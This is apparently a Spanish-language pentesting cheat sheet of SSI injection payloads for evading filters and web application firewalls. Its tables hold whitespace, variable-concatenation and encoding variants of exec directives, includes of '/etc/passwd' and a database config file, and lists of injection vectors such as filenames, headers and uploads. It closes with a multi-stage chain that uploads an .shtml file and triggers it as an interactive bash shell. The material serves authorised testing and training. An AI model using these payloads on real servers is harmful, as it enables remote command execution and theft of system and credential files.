---
aliases:
  - SSI Filter Bypass
  - SSI WAF Bypass
  - SSI Encoding
tags:
  - vuln/ssi
  - technique/defense-evasion
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Server-Side Includes (SSI) Injection]]"
---
# SSI - Evasión de Filtros

---

## Whitespace Tricks

| **Comando** | **Qué obtenés** | **Cuándo** |
|---|---|---|
| `<!--#  exec cmd="id"-->` | Bypassea filtro de `<!--#exec` literal | Multi-espacio tras `#` |
| `<!-- #exec cmd="id" -->` | Bypassea filtro de `#exec` | Espacio tras `<!--` |
| `<!--#exec cmd = "id" -->` | Bypass por espacios en el `=` | Filtro estricto de sintaxis |
| `<!--#exec\tcmd="id"-->` | Tab en vez de espacio | Filtro que solo matchea espacios |
| `<!--  #  exec  cmd  =  "id"  -->` | Múltiples espacios | Filtro de patrón rígido |
| `<!--#exec\ncmd="id"\n-->` | Newlines dentro del directive | Parsers tolerantes |

^ssi-bypass-whitespace

> [!note] `mod_include` de Apache es permisivo con variantes de whitespace; IIS tolera distinto. Probá varias.

---

## `#set` Concatenation

| **Comando** | **Qué obtenés** | **Cuándo** |
|---|---|---|
| `<!--#set var="p1" value="/etc/" --><!--#set var="p2" value="passwd" --><!--#include file="$p1$p2" -->` | Arma `/etc/passwd` partido en vars | WAF que matchea el path literal |
| `<!--#set var="a" value="ex" --><!--#set var="b" value="ec" --><!--#exec cmd="$a$b cmd" -->` | Arma la keyword `exec` partida | WAF que filtra `exec` |
| `<!--#set var="x" value="cat /etc/" --><!--#exec cmd="$x passwd" -->` | Comando concatenado | Filtro sobre el comando |
| `<!--#include file="$DOCUMENT_ROOT/../config/db.yml" -->` | Path armado con env var | Esconder el path del WAF |
| `<!--#exec cmd="cat $DOCUMENT_ROOT/../etc/passwd" -->` | Comando con env var interpolada | Combinar con concat |

^ssi-bypass-set-concat

> [!tip] El WAF inspecciona el valor **crudo**; el valor concatenado (`$p1$p2`) se arma recién en el parser SSI → escapa la regex.

---

## Inyección via Filename / Headers

| **Vector** | **Cómo** | **Cuándo** |
|---|---|---|
| Form fields | Inyectar en search/contact/comments | Vector más común |
| Filename | Nombre de archivo = `<!--#exec cmd="id" -->.txt` | Si el filename se lista en un `.shtml` |
| Profile / bio / firma | Campo reflejado en página `.shtml` | Vector persistente (stored) |
| Header `User-Agent` / `Referer` | Si se loguea en un dashboard `.shtml` | Reflexión de header |
| Header `Cookie` / `X-Custom` | Si se refleja en `.shtml` | Edge |
| URL path | `/page.shtml/<!--#exec cmd="id"-->` | Inyección por path |
| Upload `.shtml` | Subir archivo con SSI directamente | Stored exec |

^ssi-bypass-filename-headers

---

## Encoding y CGI Fallback

| **Comando** | **Qué obtenés** | **Cuándo** |
|---|---|---|
| `&lt;!--#exec cmd="id"--&gt;` | Directive con entidades HTML | Si la app decodifica antes de parsear |
| `%3C!--%23exec%20cmd=%22id%22--%3E` | Directive URL-encoded | Bypass de filtros simples |
| `<!--#exec cmd='id'-->` | Comillas simples en vez de dobles | Si `"` está filtrado |
| `<!--#exec cmd=id -->` | Sin comillas | Parsers tolerantes |
| `<!--#include virtual="/cgi-bin/test.cgi?$(id)" -->` | RCE vía CGI (bypass de `NOEXEC`) | Si un CGI acepta comando por param |

^ssi-bypass-encoding-cgi

### Multi-stage filter bypass

```html
<!-- If `#exec` blocked but `#include virtual` works: -->

<!-- Stage 1: Confirm SSI active -->
<!--#echo var="DOCUMENT_ROOT" -->

<!-- Stage 2: Read app source for upload paths -->
<!--#include file="/var/www/html/upload.php" -->

<!-- Stage 3: Upload .shtml con SSI exec (via separate upload endpoint) -->

<!-- Stage 4: Trigger uploaded shell -->
<!--#include virtual="/uploads/atacante.shtml" -->
<!-- atacante.shtml contains: <!--#exec cmd="bash -i ..."--> -->

<!-- Or chain via vulnerable CGI -->
<!--#include virtual="/cgi-bin/old-script.cgi?cmd=$(id)" -->
```

---
